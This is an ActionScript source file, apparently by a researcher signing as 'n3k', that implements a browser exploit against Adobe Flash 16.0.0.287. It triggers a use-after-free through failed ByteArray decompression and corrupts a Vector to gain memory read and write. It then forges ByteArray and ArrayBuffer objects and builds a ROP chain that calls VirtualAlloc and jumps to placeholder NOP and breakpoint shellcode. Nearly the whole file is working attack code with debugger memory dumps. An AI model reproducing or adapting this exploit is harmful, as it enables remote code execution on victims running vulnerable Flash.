package
{
	import flash.display.Sprite;
	import flash.events.Event;
	import flash.sampler.NewObjectSample;
	import flash.utils.ByteArray;
	import flash.utils.Endian;
	import flash.system.ApplicationDomain;
	import avm2.intrinsics.memory.*;
	import flash.external.ExternalInterface;
	import flash.debugger.enterDebugger;
	
	/**
	 * ...
	 * @author n3k
	 */
	 
	public class Main extends Sprite 
	{
		const NumberTAG: Number = 7;
		
		public var ba:ByteArray; 		
		public var ev: Vector.<Object>;
		public var ev_address: uint;
		public var vec_array:Vector.<Object>;
		public var flash_module_base:uint;
		
		public static function getCookie(key:String):*
		{
			return ExternalInterface.call("getCookie", key);
		}

		public static function setCookie(key:String, val:*):void
		{
			ExternalInterface.call("setCookie", key, val);
		}
		
		public function Main() 
		{
			if (stage) init();
			else addEventListener(Event.ADDED_TO_STAGE, init);			
			exploit();
		}
		
		private function init(e:Event = null):void 
		{
			removeEventListener(Event.ADDED_TO_STAGE, init);
			// entry point
		}
		
		private function read_primitive(addr: uint): uint {
			
			var fake_number_object:uint = addr | NumberTAG;
			si32(fake_number_object, 0x2C); // Store as IEEE 754 Double into Vec[1]
			
			var n: Number = new Number(this.ev[1]);
		
			var b:ByteArray = new ByteArray();
            b.endian = Endian.LITTLE_ENDIAN;
            b.writeDouble(n);
			
			var res: uint = 0;
			if (addr & 4) {
				res = b[7] * 0x1000000 + b[6] * 0x10000 + b[5] * 0x100 + b[4];
			} else {				
				res = b[3]*0x1000000 + b[2]*0x10000 + b[1]*0x100 + b[0];
			}
			
            return res;
		}
				
		private function prepare_shellcode(payload: ByteArray): void {
			payload.endian = Endian.LITTLE_ENDIAN;
			
			/* u Flash32_16_0_0_287+0x7d9f  --> Stack Pivot to the Heap
			63177d9f 52              push    edx
			63177da0 5c              pop     esp
			63177da1 8b4608          mov     eax,dword ptr [esi+8]
			63177da4 5e              pop     esi
			63177da5 c3              ret
			*/
			payload.writeUnsignedInt(flash_module_base + 0x7d9f); // # PUSH EDX # POP ESP # MOV EAX,DWORD PTR DS:[ESI+8] # POP ESI # RETN 
			payload.writeUnsignedInt(flash_module_base + 0x2ad0f3); // POP EAX # RETN
			payload.writeUnsignedInt(flash_module_base + 0xb965a4); // # ptr to &VirtualAlloc() # IAT Flash OCX
			payload.writeUnsignedInt(flash_module_base + 0x32be0); 

			/*
			 * Flash32_16_0_0_287+0x32be0:
			62542be0 8b10            mov     edx,dword ptr [eax]
			62542be2 8b4c2408        mov     ecx,dword ptr [esp+8]
			62542be6 3b11            cmp     edx,dword ptr [ecx]
			62542be8 7c02            jl      Flash32_16_0_0_287+0x32bec (62542bec)
			62542bea 8bc1            mov     eax,ecx
			62542bec c3              ret

			*/
			payload.writeUnsignedInt(flash_module_base + 0x2aa773); // PUSH EDX # ADD EAX,58046A00 # POP ESI # RETN 
			payload.writeUnsignedInt(flash_module_base + 0x50c900); // POP EBP # RETN
			payload.writeUnsignedInt(flash_module_base + 0x1e100d); // & jmp esp
			payload.writeUnsignedInt(flash_module_base + 0x2a24da); // POP EBX # RETN
			payload.writeUnsignedInt(0x00000001); // 0x00000001-> ebx
			payload.writeUnsignedInt(flash_module_base + 0x8206fe); // POP EDX # RETN
			payload.writeUnsignedInt(0x00001000); 
			payload.writeUnsignedInt(flash_module_base + 0x1175); // POP ECX # RETN
			payload.writeUnsignedInt(0x00000040); // 0x00000040-> ecx
			payload.writeUnsignedInt(flash_module_base + 0x77dc5a); // POP EDI # RETN
			payload.writeUnsignedInt(flash_module_base + 0xf0005); // RETN (ROP NOP)
			payload.writeUnsignedInt(flash_module_base + 0x2ad0f3); // POP EAX # RETN
			payload.writeUnsignedInt(0x90909090); // NOP
			payload.writeUnsignedInt(flash_module_base + 0xfd144); // PUSHAD # RETN
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0x90);
			payload.writeByte(0xCC);
			payload.writeByte(0xCC);
			payload.writeByte(0xCC);
			payload.writeByte(0xCC);
		}
		
		public function exploit(): void {
			
			for (var i:uint = 0; i < 10000; i++) new Vector.<uint>(0x3e0);
			
			this.ba = new ByteArray();
			this.ba.endian = Endian.LITTLE_ENDIAN;
			this.ba.position = 0;
			
			/* Initialize the ByteArray with some data */
			var count:uint = 0;
			while (count < 0x2000 / 4){
				this.ba.writeUnsignedInt(0xfeedface + count);
				count++;
			}

            /* Compress it with zlib */
            this.ba.compress();			
			
            /* Overwrite the compressed data with junk, starting at offset 0x200 */
            this.ba.position = 0x200;
			var pos: uint = 0;
			// ExternalInterface.call("alert", this.byte_array.bytesAvailable);
            while (pos < this.ba.bytesAvailable){				
                this.ba.writeByte(pos);
                pos++;
            }
			
            /* Create a subscriber for that ByteArray */
			// https://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/ApplicationDomain.html
            ApplicationDomain.currentDomain.domainMemory = this.ba;

            /* Trigger the bug! ByteArray::UncompressViaZlibVariant will leave ApplicationDomain.currentDomain.domainMemory
            pointing to a buffer that is freed when the decompression fails. */
			
            try{
                this.ba.uncompress();
            } catch(error:Error){
            }
			
			// ba e 1 flashbase+0x68e8cd ".printf \"Addr: %08x \\n\", eax; g"
			
			this.ev = new Vector.<Object>(0x3e0);
	
			var vecsize:uint = li32(0x24);
			//ExternalInterface.call("alert",vecsize.toString(16));
            if (vecsize == 0x3e0) {
                //si32(0xffffffff, 0x24) // corrupted
				//ExternalInterface.call("alert","vector size changed!");
            } else {
				ExternalInterface.call("document.location.reload", true);
                return // something failed
            }
			
			this.ev_address = li32(0x14) - 0x18; // Data Starts at 0x28
			var vector_vtable:uint = li32(0x20);
			var flash_16_0_0_287_base_address: uint = vector_vtable - 0x00cf9418;
			this.flash_module_base = flash_16_0_0_287_base_address;
			
			ExternalInterface.call("alert", this.ev_address.toString(16));
			
			var payload_ba: ByteArray = new ByteArray();			
			prepare_shellcode(payload_ba);	
			this.ev[0] = payload_ba;
				
			var payload_ba_address:uint = li32(0x28) & 0xFFFFFFF8; // Read Vec[0] content and clear the tag 
			//ExternalInterface.call("alert", payload_address.toString(16));
			
			var arraybuff_address: uint = read_primitive(payload_ba_address + 0x44); // ArrayBuffer addr at +44h
			//ExternalInterface.call("alert", arraybuff_address.toString(16));
			var buffer_address: uint = read_primitive(arraybuff_address + 0x08); // Buffer addr at +08h
			//ExternalInterface.call("alert", buffer_address.toString(16));
			
			/*
			0:005> dd 151cf000  // Corrupted Vector<object>
			151cf000  00010c00 00000fe0 13eff000 13dd7e18
			151cf010  1512e000 151cf018 00000010 00000000
			151cf020  656e9418 000003e0 1512f0a1 1512f0ff our elements start at 0x28
			151cf030  1512f1c1 151a45d9 00000001 00000001
			151cf040  00000001 00000001 00000001 00000001
			151cf050  00000001 00000001 00000001 00000001
			151cf060  00000001 00000001 00000001 00000001
			151cf070  00000001 00000001 00000001 00000001
			 * */
		
			
			// Let's create a new byteArray and change its pointer to point back into the Vector
			// Then craft the needed metadata using si32
			var fba: ByteArray = new ByteArray();
			fba.endian = Endian.LITTLE_ENDIAN;
			count = 0;
			while (count < 0x100) {
				fba.writeUnsignedInt(0xF0F0F0F0); // Tag
				count++;
			}
			this.ev[2] = fba;
			//fba.position = 0;
			//ExternalInterface.call("alert", fba.readUnsignedInt());
			
			/* The ByteArray Structure is 0x60 bytes
			 * 
			 0480e400  64429f70 00000002 07ca3dd0 0475c748
			 0480e410  0480e41c 00000040 00000000 64429f18
			 0480e420  6447353c 64429f14 64429f24 07fad080
			 0480e430  0789d000 07e060d0 00000000 000000c0
			 0480e440  64448084 07975608 00000000 00000000
			 0480e450  64429f0c 00000003 00000001 00000000
			 * 
			 * The Array Buffer is 0x18 bytes
			 * 
			 * ArrayBuffer
			 07975608  6442945c 00000001 07c76000 00001000
			 07975618  000000c0 00000000
			 * 
			*/
			
			var aux_vec: Vector.<uint> = new Vector.<uint>(0x100);
			count = 0;
			while (count < 0x60) { // Read the ByteArray Structure
				aux_vec[count >> 2] = read_primitive(payload_ba_address + count); 
				count += 4;
			}
			this.ev[3] = aux_vec;
			
			/* Layout of the Vector<uint> aux_vec
			 *
 0:005> dd 151a45d8 Vector<uint> Object
151a45d8  656fa060 00000002 14c1c1f0 14c0b580
151a45e8  14c1e150 00000000 00000001 14c5fab0 --> this one holds the VecBuff
151a45f8  00000000 00000000


0:005> dd 14c5fab0 // VecBuff UINT
			Size  | Separator | Elements[]<uint>
14c5fab0  00000100 13eff000 656e9f70 00000002
14c5fac0  13f15dd0 14c28748 1512f0bc 00000040
14c5fad0  00000000 656e9f18 6573353c 656e9f14
14c5fae0  656e9f24 14038080 13eff000 13dd2f10
14c5faf0  00000000 000000c0 65708084 13ef2dd0
14c5fb00  00000000 00000000 656e9f0c 00000003
14c5fb10  00000001 00000000 00000000 00000000
14c5fb20  00000000 00000000 00000000 00000000
			 * 
			 * */
			
			
			// Write into Vector ev
			count = 0;
			while(count < 0x60) {
				si32(aux_vec[count >> 2] , 0x38 + count);
				count += 4;
			}
			
			count = 0;
			while (count < 0x18) { // Read Array Buffer
				aux_vec[count >> 2] = read_primitive(arraybuff_address + count); 
				count += 4;
			}
			
			count = 0;
			while(count < 0x18) {
				si32(aux_vec[count >> 2] , 0x38 + 0x60 + count);
				count += 4;
			}
			
			// Change the ArrayBuffer ptr of the faked ByteArray to point into the faked ArrayBuffer
			si32(this.ev_address + 0x38 + 0x60, 0x38 + 0x44);
			// Change the Buffer ptr of the faked ArrayBuffer to point into the Vector
			si32(arraybuff_address, 0x38 + 0x60 + 0x08);
			// Finally change the ByteArray Object Ptr of the Vector to point into the the Faked ByteArray
			var restore_ba: uint = li32(0x30); // to restore later
			
			//this.ev[2].position = 0; // vtable of payload_ba
			//ExternalInterface.call("alert", this.ev[2].readUnsignedInt().toString(16));
			
			si32((this.ev_address + 0x38) | 1 /*Tag the Object*/, 0x30); 
			
			this.ev[2].position = 0; // vtable of payload_ba
			this.ev[2].writeUnsignedInt(buffer_address);
			
			//this.ev[2].position = 0;
			//ExternalInterface.call("alert", this.ev[2].readUnsignedInt().toString(16));
			
			ExternalInterface.call("alert", "z");
			
			//payload_ba.readUnsignedInt.toString();
			//payload_ba.clear();
			
			//ExternalInterface.call("alert", this.ev[0].toString());			
			ExternalInterface.call("document.location.reload", true);
			si32(restore_ba , 0x30); // Restore original ptr
		}
		
	}
	
}